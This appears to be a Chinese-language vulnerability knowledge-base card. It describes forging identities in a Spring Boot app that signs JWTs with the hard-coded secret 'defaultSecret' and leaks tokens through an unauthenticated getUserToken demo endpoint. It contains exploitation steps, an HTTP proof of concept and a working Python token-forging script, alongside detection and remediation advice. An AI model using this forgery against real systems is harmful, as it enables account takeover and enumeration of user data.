---
id: web-generic-jwt-demo-passtoken-getusertoken-defaultsecret-forgery
title: Spring Boot @PassToken demo 接口 getUserToken 泄露硬编码 defaultSecret 签发的 JWT：任意用户身份伪造
type: scenario
domain: web
path: web/generic/jwt
technique: springboot-passtoken-gettoken-hardcoded-jwt-forgery
tags:
- java
- spring-boot
- spring-security
- jwt
- hardcoded-secret
- token-forgery
- pass-token
- api-security
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V627
  verified_at: '2026-11-12T23:19:36+08:00'
  notes: V627 已对照 12601 原文与 12 张图核对：JwtTokenUtil 为 HS256、JwtConsts.SECRET=defaultSecret 经 Base64 解码作密钥；@PassToken 为免鉴权注解（图 04 IDE 检索 7 文件 17 匹配项，文中整理 16 个接口）；ApiDemoController#userToken 标注 @PassToken 并以 buildJWT(sub:"123") 返回 Bearer token（图 05 原图；图 07 改 sub="1" 验证）；图 11/12 为 sub=1..1000 的 tokens.txt 字典。dedup 结论 new，候选 lin-cms/小智/AJ-Report/用友 ncchr defaultSecret 均为不同产品与不同入口，非同链。已修正两处：1) 将「7 个 controller 共 17 处」改为「7 个文件 17 个匹配项、16 个接口方法」；2) Python PoC 原 pad3 写法在 Python 抛异常，按 commons-codec 1.14 实测 Base64.decodeBase64(defaultSecret)=9 字节 75e7daba5b5279cade（丢弃第 13 字符），改为 java_b64 截断等价实现并执行自检通过。未验证点：未在真实目标复现，响应中 token 打码。
url: /docs/web/generic/jwt/web-generic-jwt-demo-passtoken-getusertoken-defaultsecret-forgery/
draft: false
kb_aliases:
- '@PassToken 免鉴权接口'
- demo getUserToken 获取 token
- JwtTokenUtil 硬编码密钥
- JwtConsts.SECRET defaultSecret
- buildJWT sub 伪造身份
- SpringSecurity JWT 伪造
---

## 一句话结论

某 Spring Boot + SpringSecurity 项目的 `JwtTokenUtil` 用硬编码常量 `JwtConsts.SECRET = "defaultSecret"`（Base64 解码后）作为 HS256 密钥，而 `ApiDemoController` 的 `/api/.../demo/getUserToken` 标记了 `@PassToken`（免鉴权），会直接调用 `buildJWT("123")` 并把 `Bearer <JWT>` 返回给调用方；攻击者无需登录即可拿到框架签发的合法 token，或在本机用同一密钥把 `sub` 改成任意用户 ID 自签 token，从而伪造任意用户身份。

## 原理

- `JwtTokenUtil` 中 `JWT_ALG = SignatureAlgorithm.HS256`，`generateKey(alg)` 用 `MacProvider.generateKey(alg)` 生成密钥；而带 `rule` 的重载把配置里的 secret 做 Base64 解码后 `new SecretKeySpec(bytes, alg.getJcaName())`——`JwtConsts.SECRET` 是常量字符串 `defaultSecret`，即密钥可离线复现。
- `buildJWT(String sub)` 是最简重载：`buildJWT(sub, null, UUID.randomUUID().toString(), null, null, JwtConsts.EXPIRATION)`（jti 为随机 UUID、有效期 604800 秒），最终以 `Jwts.builder().signWith(alg, key).setSubject(sub)...compact()` 签发，并拼接 `"Bearer "` 前缀。
- `@PassToken` 是项目自定义的免鉴权注解，IDE 检索到 7 个文件共 17 个匹配项（文中整理出 16 个免鉴权接口方法，覆盖新闻、广告、通知、短信验证码、用户注册/第三方登录等公开接口）。其中 `ApiDemoController#userToken` 标注 `@PassToken`，内部 `JwtTokenUtil.buildJWT("123")` 后返回 `{"token":"Bearer eyJ..."}`——一个演示用接口把"登录态"直接发给了匿名访问者。
- 为什么成立：JWT 的安全前提是签名密钥保密。密钥是源码常量 + 项目公开（演示/开源系统），任何人可复现 `generateKey` 的 Base64 解码与 HS256 签名；而验签通过的 token 中 `sub` 就是业务身份（`ApiContext.getUserId()` 从 token 解析），所以改 `sub` 即改身份。`@PassToken` 又提供了一个无需任何凭据获取"合法格式 token"的入口，进一步降低利用门槛。

## 触发条件

- 目标为使用该 JWT 工具类/常量（`JwtConsts.SECRET = "defaultSecret"`）的 Spring Boot 项目，且 `@PassToken` 注解的 `demo/getUserToken` 接口对外可达。
- 业务以 JWT `sub` 作为用户标识且不校验 token 与用户状态（部分接口仅验签）。
- 攻击者能访问任一需要 JWT 的 API（用于验证伪造 token 生效）。

## 利用步骤

1. 枚举/访问公开接口：`GET /api/<module>/demo/getUserToken`，确认返回 `{"code":200,"message":"ok","token":"Bearer eyJ..."}`。
2. 解析返回的 JWT（jwt.io/base64），确认 header 为 HS256、payload 中 `sub` 为演示用户 ID。
3. 伪造：用 `defaultSecret`（按代码做 Base64 解码）作 HMAC 密钥，自签 `sub=<目标用户ID>`、`exp` 为未来的 token；或用项目公开的 Java `buildJWT(String sub)` 逻辑本地生成（jti 用任意 UUID 均可）。
4. 将 `Bearer <伪造 token>` 放入 `Authorization` 头访问需鉴权接口，确认以目标用户身份返回数据（如 `/api/.../user/info`）。
5. 结合下游越权（如按 `sub` 查询用户详情的接口）批量遍历用户 ID。

## PoC

匿名获取 token：

```http
GET /api/<module>/demo/getUserToken HTTP/1.1
Host: target

HTTP/1.1 200 OK
{"code":200,"message":"ok","token":"Bearer eyJhbGciOiJIUzI1NiJ9..."}
```

自签等价实现（Python，密钥处理与 `Base64.decodeBase64("defaultSecret")` 一致；若目标 secret 为其他值替换即可）：

```python
import base64, hmac, hashlib, json, time

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

def java_b64(s):
    # 等价 Apache Commons Codec Base64.decodeBase64：丢弃不足 4 字符的尾部残片
    s = s[: len(s) // 4 * 4]
    return base64.b64decode(s) if s else b""

secret = java_b64("defaultSecret")  # 9 字节 75e7daba5b5279cade（第 13 个字符 t 被丢弃）
header = b64url(json.dumps({"alg": "HS256"}, separators=(",", ":")).encode())
payload = b64url(json.dumps({
    "sub": "1",                 # 目标用户 ID
    "jti": "any-uuid",
    "iat": int(time.time()),
    "exp": int(time.time()) + 604800,
}, separators=(",", ":")).encode())
signing_input = header + b"." + payload
sig = b64url(hmac.new(secret, signing_input, hashlib.sha256).digest())
print("Bearer " + (signing_input + b"." + sig).decode())
```

原文为绕过 Java→Python 的 `UUID.randomUUID`/`SecretKeySpec` 差异，直接用 Java 循环生成 `sub=1..1000` 的 token 字典写入 `tokens.txt`，再交给 Python 遍历请求。

## 变体与关联

- **其他硬编码 JWT 密钥**：[[web-generic-jwt-xiaozhi-default-hs256-secret-forgery]]、[[web-generic-jwt-hugegraph-hardcoded-secret-token-forgery]]、[[web-java-component-aj-report-default-jwt-sharetoken-forgery]]、[[web-generic-jwt-lin-cms-fixed-secret-identity-claim-privilege-escalation]]。
- **免鉴权注解审计**：枚举 `@PassToken`/`@IgnoreAuth`/`@Anonymous` 等注解的使用点，常能找到 demo、日志、上传等危险公开接口。
- **下游利用**：[[web-generic-auth-jwt-sub-user-info-idor-enumeration]]（本卡 token 用于遍历用户详情）。
- **变体**：若 secret 是随机生成但泄露在 jar/配置/前端，思路相同；若算法为 RS256 且公钥可获取，可评估 alg 混淆。

## 检测与防御

- **修复**：JWT 密钥改为部署时随机生成并放入密钥管理，禁用源码常量；删除/收紧 demo 类接口，`@PassToken` 只允许真正公开的业务接口；对 token 增加用户存在性/状态/版本校验。
- **审计**：搜索 `JwtConsts`、`SECRET`、`defaultSecret`、`generateKey(`, `@PassToken`；核对所有免鉴权注解方法的返回值是否泄露凭证。
- **检测**：`getUserToken` 等 demo 接口的匿名访问；同一 IP 使用多个不同 `sub` 的 JWT 访问；JWT 的 `jti` 为异常/重复值或 payload 与正常签发格式不符。
